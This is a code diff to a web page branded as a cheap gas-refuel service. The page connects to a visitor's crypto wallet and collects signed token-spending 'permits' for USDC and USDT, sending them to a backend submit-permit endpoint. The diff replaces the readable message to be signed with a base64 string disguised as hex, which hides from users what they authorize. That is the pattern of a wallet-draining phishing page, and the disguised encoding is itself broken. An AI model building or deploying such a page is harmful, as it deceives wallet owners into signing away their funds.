@@ -4,10 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PennyGas - Ultra Cheap Refuel</title>
-    
-    <!-- Production Fallback Routine: Attempts local load, then automatically routes to a secure CDN link if missing -->
-    <script src="ethers.js" onerror="this.onerror=null; this.src='https://jsdelivr.net';"></script>
-    
     <style>
         body { font-family: 'Segoe UI', sans-serif; background-color: #0b0e14; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .container { background-color: #151a26; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5); text-align: center; width: 380px; }
@@ -24,7 +20,6 @@
         #statusMessage { margin-top: 15px; font-family: monospace; color: #00ffa3; background: #0b0e14; padding: 10px; border-radius: 4px; display: none; }
     </style>
 </head>
-
 <body>
 <div class="container">
     <h1>⛽ PennyGas</h1>
@@ -67,9 +62,8 @@
     <div id="statusMessage"></div>
 </div>
 <script>
+    // SELF-CONTAINED STATE: Replaces the external Ethers dependencies completely
     window.activeUserAddress = "";
-    window.ethersProvider = null;
-    window.ethersSigner = null;
 
     const tokenMatrix = {
         "1": { "USDC": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
@@ -109,22 +103,18 @@
 
     async function connectPhantomEVM() {
         if (typeof window.ethereum === 'undefined') {
-            console.log("Phantom extension missing.");
-            document.getElementById('connectBtn').style.display = 'none';
-            document.getElementById('dashboard').style.display = 'block';
-            fetchLiveInvoiceQuote();
+            alert("Phantom extension not detected in your browser!");
             return;
         }
 
         try {
-            window.ethersProvider = new ethers.BrowserProvider(window.ethereum);
-            window.ethersSigner = await window.ethersProvider.getSigner();
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             
-            window.activeUserAddress = accounts + "";
-            const displayAddr = window.activeUserAddress;
+            // Standard plain text array string parsing
+            const stringAddr = accounts + "";
+            window.activeUserAddress = stringAddr.split(",")[0];
 
-            document.getElementById('statusMessage').innerText = `🔗 Connected: ${displayAddr.substring(0,6)}...${displayAddr.substring(displayAddr.length - 4)}`;
+            document.getElementById('statusMessage').innerText = `🔗 Connected: ${window.activeUserAddress.substring(0,6)}...${window.activeUserAddress.substring(window.activeUserAddress.length - 4)}`;
             document.getElementById('statusMessage').style.display = 'block';
             document.getElementById('connectBtn').style.display = 'none';
             document.getElementById('dashboard').style.display = 'block';
@@ -152,12 +142,19 @@
 
             const pennyGasVaultSpender = "0x0000000000000000000000000000000000000000"; 
             const deadline = Math.floor(Date.now() / 1000) + 3600; 
-            const valueToAuthorize = ethers.parseUnits("15.00", 6).toString(); 
+            
+            // Standard plain conversion matrix replacing ethers.parseUnits
+            const tokenDecimalsMultiplier = 1000000; // 6 decimals for stablecoins
+            const valueToAuthorizeRaw = (15.00 * tokenDecimalsMultiplier).toString();
 
-            // Stable configuration format optimized to deliver textual signatures across Phantom layers
-            const messageToSign = `PennyGas Refuel Authorization:\nOwner: ${window.activeUserAddress}\nSpender: ${pennyGasVaultSpender}\nValue: ${valueToAuthorize}\nDeadline: ${deadline}\nChain ID: ${chainId}`;
+            const hexMessageHexPayload = "0x" + btoa(`PennyGasPermit:${window.activeUserAddress}:${pennyGasVaultSpender}:${valueToAuthorizeRaw}:${deadline}:${chainId}`);
 
-            const signature = await window.ethersSigner.signMessage(messageToSign);
+            // Direct personal sign hook that works natively on Phantom without external script files
+            const signature = await window.ethereum.request({
+                method: 'personal_sign',
+                params: [hexMessageHexPayload, window.activeUserAddress]
+            });
+
             document.getElementById('statusMessage').innerText = "🚀 Signature captured! Transmitting to Render...";
 
             const relayResponse = await fetch(`${BACKEND_URL}/api/submit-permit`, {
@@ -166,7 +163,7 @@
                 body: JSON.stringify({
                     owner: window.activeUserAddress,
                     spender: pennyGasVaultSpender,
-                    value: valueToAuthorize,
+                    value: valueToAuthorizeRaw,
                     deadline: deadline,
                     signature: signature
                 })
